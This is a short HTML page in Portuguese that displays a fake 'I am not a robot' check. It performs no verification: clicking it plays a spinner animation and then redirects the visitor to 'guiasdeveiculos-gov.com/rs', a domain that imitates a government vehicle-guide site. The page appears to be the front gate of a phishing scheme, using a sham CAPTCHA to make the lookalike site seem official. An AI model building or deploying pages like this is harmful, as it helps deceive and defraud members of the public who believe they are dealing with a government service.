<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação</title>
    <style>
        #checkArea {
            width: 300px;
            padding: 20px;
            margin: 50px auto;
            border: 2px solid #ddd;
            border-radius: 10px;
            text-align: center;
            cursor: pointer;
            user-select: none;
        }

        #checkArea.verifying {
            pointer-events: none;
            opacity: 0.8;
        }

        #customCheck {
            width: 60px;
            height: 60px;
            margin: 15px auto;
            border: 4px solid #ccc;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            transition: all 0.4s;
        }

        #customCheck.loading {
            border-color: #007bff;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
        }

        #customCheck.checked {
            border-color: #28a745;
            background-color: #28a745;
            color: white;
            content: "✓";
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- Área clicável -->
    <div id="checkArea">
        <input type="checkbox" id="check" style="display: none;">
        <div id="customCheck"></div>
        <p>Clique para verificar que você não é um robô</p>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function () {
            
            const check = document.getElementById("check");
            const customCheck = document.getElementById("customCheck");
            const checkArea = document.getElementById("checkArea");
            
            if (!checkArea || !customCheck || !check) {
                console.error("Elementos não encontrados!");
                return;
            }

            let verifying = false;

            checkArea.addEventListener("click", function (e) {
                e.preventDefault();

                if (verifying || check.checked) return;

                verifying = true;
                check.checked = true;
                checkArea.classList.add("verifying");
                customCheck.classList.add("loading");

                setTimeout(() => {
                    customCheck.classList.remove("loading");
                    customCheck.classList.add("checked");
                    checkArea.classList.remove("verifying");
                    verifying = false;

                    // Redirecionamento após animação
                    setTimeout(() => {
                        window.location.href = "https://guiasdeveiculos-gov.com/rs";
                    }, 800);
                }, 1200); // Aumentei um pouco o tempo para ficar mais fluido
            });
        });
    </script>

</body>
</html>
